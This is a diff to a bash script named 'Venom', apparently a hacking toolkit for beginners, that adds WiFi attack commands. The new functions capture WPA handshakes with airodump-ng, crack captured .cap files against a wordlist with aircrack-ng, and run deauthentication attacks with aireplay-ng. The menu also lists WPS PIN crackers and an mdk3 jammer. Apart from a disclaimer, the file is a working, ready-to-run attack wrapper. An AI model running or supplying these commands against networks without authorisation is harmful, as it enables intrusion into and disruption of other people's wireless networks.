@@ -2,7 +2,7 @@
 #A tool to help begining hackers
 #Do not use for illegal purposes! White hat hacking or
 #goverment use! This is for educational purposes only!
-# v 3.0 2020 release
+# v 3.1 2020 release
 
 function port_scan () {
     echo "Starting port scan on port $1"
@@ -64,6 +64,25 @@ function mdk3_func () {
     echo "Done!"
 }
 
+function handshake_func () {
+    echo "Performing handshake with bssid $1 on interface $2 on channel $3"
+    sudo airodump-ng -c $3 --bssid $1 -w capture $2
+    echo "Saved in .cap file capture"
+    echo "Done!"
+}
+
+function cap_crack () {
+    echo "Cracking .cap file $1 with dictionary $2"
+    sudo aircrack-ng $1 -w $2
+    echo "Done!"
+}
+
+function dauth_attack () {
+    echo "Performing deauth attack on bssid $1 on interface $2"
+    sudo aireplay-ng -0 10 -a $1 $2
+    echo "Done!"
+}
+
 function print_tools () {
     echo "Tools used by Venom 3"
     echo "nmap | sudo apt-get install nmap"
@@ -107,7 +126,7 @@ function install_tool () {
 }
 
 function main () {
-    echo "Venom v 3.0 - New and Improved!"
+    echo "Venom v 3.1 - New and Improved!"
     echo "p - port scan | venom p <port name>"
     echo "imon - put interface into monitor mode | venom imon <interface>"
     echo "iman - put interface into managed mode | venom iman <interface>"
@@ -118,6 +137,9 @@ function main () {
     echo "rp - reaver Wpa-Wpa2 Password Cracker with pixiewps | venom rp <bssid> <interface>"
     echo "bp - bully Wpa-Wpa2 Password Cracker with pixiewps | venom bp <bssid> <interface>"
     echo "mj - mdk3 WiFi Jammer | venom mj <channel> <interface>"
+    echo "hsh - Perform a wpsk handshake | venom hsh <bssid> <interface> <channel>"
+    echo "dauth - Perform a deauth attack | venom dauth <bssid> <interface>"
+    echo "cc - .cap file cracker | venom cc <file name> <dictionary>"
     echo "h - displays help screen"
     echo ""
     echo "type 'venom t' to see a list of tool names"
@@ -167,6 +189,15 @@ then
 elif [[ "$1" == "inst" ]]
 then
     install_tool $2
+elif [[ "$1" == "hsh" ]]
+then
+    handshake_func $2 $3 $4
+elif [[ "$1" == "cc" ]]
+then
+    cap_crack $2 $3
+elif [[ "$1" == "dauth" ]]
+then
+    dauth_attack $2 $3
 else
     main
 fi
